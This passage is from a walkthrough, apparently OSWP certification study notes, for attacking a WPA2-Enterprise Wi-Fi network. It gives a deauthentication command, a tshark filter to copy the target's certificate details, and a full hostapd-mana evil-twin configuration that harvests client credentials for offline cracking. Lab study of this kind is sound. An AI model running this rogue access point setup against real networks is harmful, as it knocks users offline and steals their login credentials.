> Once we are doing the targeted sniff, we can do a deauth attack in another terminal session:

```
sudo aireplay-ng -0 1 -e <essid> -a <bssid> -c <station> wlan0mon
```

> Once we capture a WPA handshake we can stop Airodump with CTRL + C then stop monitor mode:

```
sudo airmon-ng stop wlan0mon
```

> Now we need to extract details about the Certificate Authority (CA) and server. We can use tshark for this and supply the BSSID of our target network:

I got this super helpful command from here: https://infosecwriteups.com/practical-study-material-oswp-part-2-wpa2-mgt-walkthrough-d87d11a77aa8

```
tshark -r mgt-01.cap -Y "wlan.bssid == <bssid> && eap && tls.handshake.certificate" -
V | grep rdnSequence: -A 1 | head -n 5
```

> We should have our extracted information here about the CA and the server and now we can create our conf file to add in the details:

```
cd /etc/freeradius/3.0/certs
```

```
nano ca.cnf
```

> Here we can add in the details for the CA. Our file should look something like this:

```
[certificate_authority]
CountryName = 
stateOrProvinceName = 
localityName = 
organizationName = 
emailAddress = 
commonName = 
```

> Now we can save this file and then create our conf file for the server as well:

```
nano server.cnf
```

> Here we can add in the details for the server. Our file should look something like this:

```
[server]
CountryName = 
stateOrProvinceName = 
localityName = 
organizationName = 
emailAddress = 
commonName = 
```

> We save this file and now we can generate the certificates we need:

```
rm dh
```

```
make
```

> Now we need to create our hostapd mana.conf file:

```
cd /etc/hostapd-mana
```

```
nano mana.conf
```

Below is our entire file with the SSID of our target AP added at the top:

```
# SSID of the AP
ssid=<target_ssid>

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```

> Once we save this file we will create our mana.eap_user file:

```
nano mana.eap_user
```

Below is the entire file:

```
* PEAP,TTLS,TLS,FAST
"t" TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2
"pass" [2]
```

> Once we have saved this file we can go to our home directory and then run hostapd with our mana.conf file:

```
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```

We should receive our output here after a bit with a command which tells us how to crack the password hash. Now we can take this and provide a wordlist to crack it. We should also note down the "identity" in the output as we will need it for our configuration file later for connecting to the AP.
